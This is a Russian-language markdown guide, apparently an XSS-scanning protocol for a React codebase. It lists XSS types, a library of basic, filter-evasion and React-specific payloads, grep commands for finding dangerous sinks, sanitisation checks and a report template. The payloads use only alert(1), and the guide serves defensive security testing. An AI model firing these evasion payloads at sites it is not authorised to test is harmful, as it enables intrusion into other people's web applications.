# XSS Scanner — Сканер межсайтового скриптинга

## Типы XSS

| Тип | Вектор | Пример |
|---|---|---|
| Reflected | URL параметры | `?search=<script>alert(1)</script>` |
| Stored | Сохранённый user input | Сообщение в чате с payload |
| DOM-based | Client-side JS | `document.location.hash` → innerHTML |
| Mutation | Parser differences | `<noscript><p title="</noscript><img src=x onerror=alert(1)>">` |

## Payload Library

### Basic
```
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
```

### Evasion
```
<ScRiPt>alert(1)</ScRiPt>
<script>alert&#40;1&#41;</script>
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">
<img src=x onerror=alert`1`>
<svg/onload=alert(1)>
```

### React-specific
```
javascript:alert(1) (в href)
data:text/html,<script>alert(1)</script> (в href)
{{''.constructor.constructor('alert(1)')()}} (template injection)
dangerouslySetInnerHTML={{__html: userInput}}
```

## Протокол сканирования

### 1. Найти все input points
```
grep -r "dangerouslySetInnerHTML" src/
grep -r "innerHTML" src/
grep -r "document.write" src/
grep -r "eval(" src/
grep -r "href={" src/ | grep -v "http"
grep -r "<a " src/ | grep "href"
```

### 2. Проверить каждый input
```
Для каждого <input>, <textarea>, contentEditable:
1. Ввести каждый payload из библиотеки
2. Проверить: payload отрендерился как текст (безопасно) или как HTML (XSS!)
3. Проверить: payload в URL параметрах
4. Проверить: payload после сохранения и загрузки (stored XSS)
```

### 3. Проверить sanitization
```
Должны быть:
- DOMPurify.sanitize() для любого user HTML
- encodeURIComponent() для URL параметров
- Нет dangerouslySetInnerHTML с user data
- CSP header: script-src 'self'
```

### 4. Отчёт
```
SEVERITY: Critical (stored XSS) / High (reflected) / Medium (DOM-based)
LOCATION: файл:строка
PAYLOAD: {payload}
FIX: {конкретное исправление}
```
